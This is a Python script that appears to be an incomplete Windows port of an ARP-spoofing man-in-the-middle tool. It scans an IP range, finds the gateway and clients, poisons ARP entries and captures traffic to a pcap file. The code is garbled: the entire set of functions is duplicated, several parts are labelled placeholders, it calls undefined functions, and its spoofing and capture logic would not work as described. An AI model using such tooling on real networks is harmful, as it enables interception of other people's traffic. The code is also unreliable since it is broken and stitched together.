import scapy.all as scapy
import subprocess
import sys
import time
import os
import threading
import ctypes  # Import ctypes for Windows admin mode check
from ipaddress import IPv4Network

# We want the current working directory.
cwd = os.getcwd()

# Function to check whether the script was run with administrative privileges.
# It will stop the execution if the user didn't run the script as an administrator.
def in_admin_mode():
    """If the user doesn't run the program with administrative privileges, don't allow them to continue."""
    try:
        # Check if the script is run with administrative privileges on Windows.
        if not ctypes.windll.shell32.IsUserAnAdmin():
            raise PermissionError("Please run this program as an administrator.")
    except Exception as e:
        print("Error:", e)
        exit()

# Replace the sudo check with the admin check for Windows.
in_admin_mode()

# Replace the route command with the Windows equivalent (route print).
def get_gateway_info():
    """Retrieve the gateway information on Windows."""
    try:
        result = subprocess.run(["route", "print"], capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        print("Error:", e)
        exit()

# Replace the arp command with the Windows equivalent (arp -a).
def arp_scan(ip_range):
    """Perform ARP scan using the arp command on Windows."""
    try:
        result = subprocess.run(["arp", "-a", ip_range], capture_output=True, text=True)
        # Process the output to extract IP and MAC addresses.
        # Modify this part based on the actual output format of the arp command on Windows.
        # The following is just a placeholder.
        lines = result.stdout.splitlines()
        arp_responses = []
        for line in lines:
            parts = line.split()
            if len(parts) >= 3:
                ip_address = parts[1]
                mac_address = parts[2]
                arp_responses.append({"ip": ip_address, "mac": mac_address})
        return arp_responses
    except Exception as e:
        print("Error:", e)
        exit()

# Replace the route command with the Windows equivalent (route print).
def get_interface_names():
    """Retrieve network interface names on Windows."""
    try:
        result = subprocess.run(["netsh", "interface", "show", "interface"], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        interface_names = []
        for line in lines:
            parts = line.split()
            if len(parts) >= 3:
                interface_names.append(parts[2])
        return interface_names
    except Exception as e:
        print("Error:", e)
        exit()

# Replace the sysctl command with the Windows equivalent (not needed on Windows).
def allow_ip_forwarding():
    """Allow IP forwarding on Windows (not needed)."""
    pass

# Modify the ARP spoofing function based on the Windows ARP packet structure.
def arp_spoofer(target_ip, target_mac, spoof_ip):
    """Spoof ARP packets on Windows."""
    try:
        # Modify this part based on the actual ARP packet structure on Windows.
        # The following is just a placeholder.
        subprocess.run(["arp", "-s", target_ip, target_mac])
        subprocess.run(["arp", "-s", spoof_ip, target_mac])
    except Exception as e:
        print("Error:", e)

# Modify the function to get the default gateway information on Windows.
def gateway_info(network_info):
    """Retrieve the gateway information on Windows."""
    try:
        # Modify this part based on the actual output format of the route command on Windows.
        # The following is just a placeholder.
        result = subprocess.run(["route", "print"], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        gateways = []
        for iface in network_info:
            for line in lines:
                if iface["ip"] in line:
                    iface_name = match_iface_name(line)
                    gateways.append({"iface": iface_name, "ip": iface["ip"], "mac": iface["mac"]})
        return gateways
    except Exception as e:
        print("Error:", e)
        exit()

# Modify the function to run the packet sniffer on Windows.
def packet_sniffer(interface):
    """Run packet sniffer on Windows."""
    # Modify this part based on the actual syntax to capture packets on Windows.
    # The following is just a placeholder.
    subprocess.run(["netsh", "trace", "start", "capture=yes", "IPv4.Address==" + interface, "filemode=single", "overwrite=yes"])

# Modify the function to process sniffed packets on Windows.
def process_sniffed_pkt(pkt):
    """Process sniffed packets on Windows."""
    print("Writing to pcap file. Press ctrl + c to exit.")
    # Modify this part based on the actual syntax to write packets to a file on Windows.
    # The following is just a placeholder.
    subprocess.run(["netsh", "trace", "stop"])
    subprocess.run(["netsh", "trace", "report", "capture.etl", "outputfile=requests.pcap"])

# Modify the sysctl commands with the Windows equivalent (not needed on Windows).
def get_cmd_arguments():
    """Validate command line arguments on Windows."""
    ip_range = None
    try:
        # Check if the correct command line arguments are supplied.
        if len(sys.argv) - 1 > 0 and sys.argv[1] != "-ip_range":
            raise ValueError("-ip_range flag not specified.")
        elif len(sys.argv) - 1 > 0 and sys.argv[1] == "-ip_range":
            # Check if the supplied IP range is valid.
            ip_range = str(IPv4Network(sys.argv[2]))
            print("Valid IP range entered through command-line.")
    except Exception as e:
        print("Error:", e)
    return ip_range

# Function to check whether the script was run with administrative privileges.
# It will stop the execution if the user didn't run the script as an administrator.
def in_admin_mode():
    """If the user doesn't run the program with administrative privileges, don't allow them to continue."""
    try:
        # Check if the script is run with administrative privileges on Windows.
        if not ctypes.windll.shell32.IsUserAnAdmin():
            raise PermissionError("Please run this program as an administrator.")
    except Exception as e:
        print("Error:", e)
        exit()

# Replace the sudo check with the admin check for Windows.
in_admin_mode()

# Replace the route command with the Windows equivalent (route print).
def get_gateway_info():
    """Retrieve the gateway information on Windows."""
    try:
        result = subprocess.run(["route", "print"], capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        print("Error:", e)
        exit()

# Replace the arp command with the Windows equivalent (arp -a).
def arp_scan(ip_range):
    """Perform ARP scan using the arp command on Windows."""
    try:
        result = subprocess.run(["arp", "-a", ip_range], capture_output=True, text=True)
        # Process the output to extract IP and MAC addresses.
        # Modify this part based on the actual output format of the arp command on Windows.
        # The following is just a placeholder.
        lines = result.stdout.splitlines()
        arp_responses = []
        for line in lines:
            parts = line.split()
            if len(parts) >= 3:
                ip_address = parts[1]
                mac_address = parts[2]
                arp_responses.append({"ip": ip_address, "mac": mac_address})
        return arp_responses
    except Exception as e:
        print("Error:", e)
        exit()

# Replace the route command with the Windows equivalent (route print).
def get_interface_names():
    """Retrieve network interface names on Windows."""
    try:
        result = subprocess.run(["netsh", "interface", "show", "interface"], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        interface_names = []
        for line in lines:
            parts = line.split()
            if len(parts) >= 3:
                interface_names.append(parts[2])
        return interface_names
    except Exception as e:
        print("Error:", e)
        exit()

# Replace the sysctl command with the Windows equivalent (not needed on Windows).
def allow_ip_forwarding():
    """Allow IP forwarding on Windows (not needed)."""
    pass

# Modify the ARP spoofing function based on the Windows ARP packet structure.
def arp_spoofer(target_ip, target_mac, spoof_ip):
    """Spoof ARP packets on Windows."""
    try:
        # Modify this part based on the actual ARP packet structure on Windows.
        # The following is just a placeholder.
        subprocess.run(["arp", "-s", target_ip, target_mac])
        subprocess.run(["arp", "-s", spoof_ip, target_mac])
    except Exception as e:
        print("Error:", e)

# Modify the function to get the default gateway information on Windows.
def gateway_info(network_info):
    """Retrieve the gateway information on Windows."""
    try:
        # Modify this part based on the actual output format of the route command on Windows.
        # The following is just a placeholder.
        result = subprocess.run(["route", "print"], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        gateways = []
        for iface in network_info:
            for line in lines:
                if iface["ip"] in line:
                    iface_name = match_iface_name(line)
                    gateways.append({"iface": iface_name, "ip": iface["ip"], "mac": iface["mac"]})
        return gateways
    except Exception as e:
        print("Error:", e)
        exit()

# Modify the function to run the packet sniffer on Windows.
def packet_sniffer(interface):
    """Run packet sniffer on Windows."""
    # Modify this part based on the actual syntax to capture packets on Windows.
    # The following is just a placeholder.
    subprocess.run(["netsh", "trace", "start", "capture=yes", "IPv4.Address==" + interface, "filemode=single", "overwrite=yes"])

# Modify the function to process sniffed packets on Windows.
def process_sniffed_pkt(pkt):
    """Process sniffed packets on Windows."""
    print("Writing to pcap file. Press ctrl + c to exit.")
    # Modify this part based on the actual syntax to write packets to a file on Windows.
    # The following is just a placeholder.
    subprocess.run(["netsh", "trace", "stop"])
    subprocess.run(["netsh", "trace", "report", "capture.etl", "outputfile=requests.pcap"])

# Modify the sysctl commands with the Windows equivalent (not needed on Windows).
def get_cmd_arguments():
    """Validate command line arguments on Windows."""
    ip_range = None
    try:
        # Check if the correct command line arguments are supplied.
        if len(sys.argv) - 1 > 0 and sys.argv[1] != "-ip_range":
            raise ValueError("-ip_range flag not specified.")
        elif len(sys.argv) - 1 > 0 and sys.argv[1] == "-ip_range":
            # Check if the supplied IP range is valid.
            ip_range = str(IPv4Network(sys.argv[2]))
            print("Valid IP range entered through command-line.")
    except Exception as e:
        print("Error:", e)
    return ip_range

# Get the IP range from command line arguments.
ip_range = get_cmd_arguments()

# If the IP range is not valid, exit the script.
if ip_range is None:
    print("No valid IP range specified. Exiting!")
    exit()

# Perform ARP scan on Windows.
arp_res = arp_scan(ip_range)

# If there is no connection, exit the script.
if not arp_res:
    print("No connection. Exiting, make sure devices are active or turned on.")
    exit()

# Get the gateway information on Windows.
gateways = gateway_info(arp_res)

# The gateway will be in position 0 of the list, for easy use we just assign it to a variable.
gateway_info = gateways[0]

# The gateways are removed from the clients.
client_info = clients(arp_res, gateways)

# If there are no clients, then the program will exit from here.
if not client_info:
    print("No clients found when sending the ARP messages. Exiting, make sure devices are active or turned on.")
    exit()

# ...
